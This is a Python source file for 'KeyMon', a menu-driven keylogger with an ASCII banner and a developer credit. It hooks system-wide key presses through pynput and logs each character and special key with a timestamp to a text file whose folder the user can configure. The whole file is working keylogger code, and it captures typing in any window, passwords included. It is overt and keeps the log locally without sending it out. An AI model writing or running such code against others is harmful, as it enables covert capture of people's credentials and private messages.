import os
import logging
from pynput.keyboard import Key, Listener

class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class KeyMon:
    def __init__(self):
        self.log_file = "keylog.txt"
        self.listener = None
        self.running = False

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_header(self):
        # Ultra-Bold Block ASCII Art with Developer Credits
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
 ██╗  ██╗███████╗██╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗
 ██║ ██╔╝██╔════╝╚██╗ ██╔╝████╗ ████║██╔═══██╗████╗  ██║
 █████╔╝ █████╗   ╚████╔╝ ██╔████╔██║██║   ██║██╔██╗ ██║
 ██╔═██╗ ██╔══╝    ╚██╔╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║
 ██║  ██╗███████╗   ██║   ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
 ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
{Colors.END}{Colors.PURPLE}{Colors.BOLD}          Developed by: Mohammed Shezil {Colors.END}
{Colors.YELLOW}             [ PRECISE KEYSTROKE MONITORING ]
{Colors.END}"""
        print(banner)
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")

    def set_save_location(self):
        self.clear_screen()
        self.show_header()
        print(f"\n{Colors.BOLD}CURRENT LOG PATH:{Colors.END} {Colors.BLUE}{os.path.abspath(self.log_file)}{Colors.END}")
        path = input(f"\n{Colors.YELLOW}Enter target directory (leave blank to cancel): {Colors.END}").strip()
        
        if path:
            if os.path.isdir(path):
                self.log_file = os.path.join(path, "keylog.txt")
                print(f"\n{Colors.GREEN}✔ DIRECTORY UPDATED{Colors.END}")
            else:
                print(f"\n{Colors.RED}✘ ERROR: Invalid Directory Path{Colors.END}")
        
        input(f"\n{Colors.CYAN}Return to menu [Enter]{Colors.END}")

    def on_press(self, key):
        try:
            # Captures standard alphanumeric keys
            logging.info(f"Key: {key.char}")
        except AttributeError:
            # Captures special keys like Space, Enter, etc.
            logging.info(f"Special Key: {key}")

    def start_logging(self):
        # Re-initialize logging to ensure it uses the latest path/file settings
        logging.basicConfig(filename=self.log_file, level=logging.DEBUG, 
                            format='%(asctime)s: %(message)s', force=True)
        
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
        self.running = True
        
        self.clear_screen()
        self.show_header()
        print(f"{Colors.RED}{Colors.BOLD}● STATUS: LOGGING ACTIVE{Colors.END}")
        print(f"{Colors.BOLD}FILE:{Colors.END} {self.log_file}")
        print(f"\n{Colors.YELLOW}{Colors.UNDERLINE}>>> FOCUS THIS WINDOW AND PRESS 'ENTER' TO STOP <<<{Colors.END}")
        input()
        self.stop_logging()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.running = False
        print(f"\n{Colors.GREEN}✔ LOGGING TERMINATED. SESSION SAVED.{Colors.END}")
        input(f"\n{Colors.CYAN}Return to menu [Enter]{Colors.END}")

    def run(self):
        while True:
            self.clear_screen()
            self.show_header()
            print(f"{Colors.BOLD}CONTROL PANEL:{Colors.END}")
            print(f" {Colors.GREEN}[1]{Colors.END} INITIALIZE KEYLOGGER")
            print(f" {Colors.GREEN}[2]{Colors.END} CONFIGURE STORAGE PATH")
            print(f" {Colors.RED}[3]{Colors.END} SHUTDOWN")
            
            choice = input(f"\n{Colors.CYAN}{Colors.BOLD}KEYMON > {Colors.END}")

            if choice == '1':
                self.start_logging()
            elif choice == '2':
                self.set_save_location()
            elif choice == '3':
                print(f"\n{Colors.YELLOW}Shutting down... Session ended, Mohammed Shezil.{Colors.END}")
                break
            else:
                print(f"{Colors.RED}Invalid input.{Colors.END}")
                import time
                time.sleep(1)

if __name__ == "__main__":
    # Initialize Windows console for ANSI color support
    if os.name == 'nt':
        os.system('color') 
    
    km = KeyMon()
    km.run()
